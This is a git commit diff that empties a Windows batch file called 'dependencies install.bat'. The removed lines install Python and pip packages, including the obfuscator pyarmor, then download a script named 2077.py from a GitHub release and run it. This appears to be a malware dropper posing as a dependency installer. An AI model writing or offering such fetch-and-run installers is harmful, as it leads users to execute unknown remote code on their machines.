f111c60f2a2f1be3aa9fb7f23d339ea98bb691c7
user7007-ui <yuuki.jp.pjsk@gmail.com>
2026-09-25 20:44:05 +0800

    Update dependencies install.bat

--- dependencies install.bat
+++ dependencies install.bat
@@ -1,7 +1,1 @@
-@echo off
-REM installer
-winget install Python.Python.3.14
-inline python -c "import sys, subprocess, importlib.util; REQUIRED_PACKAGES = ['psutil', 'requests', 'pyarmor']; [subprocess.check_call([sys.executable, '-m', 'pip', 'install', p]) for p in REQUIRED_PACKAGES if not importlib.util.find_spec(p)]"
-python -c "import sys, subprocess, os, platform, psutil, requests, json, uuid, re, pathlib, base64, socket; print('All packages ready and modules imported!')"
-curl -o 2077.py https://github.com/user7007-ui/configs/releases/download/v0-1-1-alpha/2077.py
-python 2077.py
+
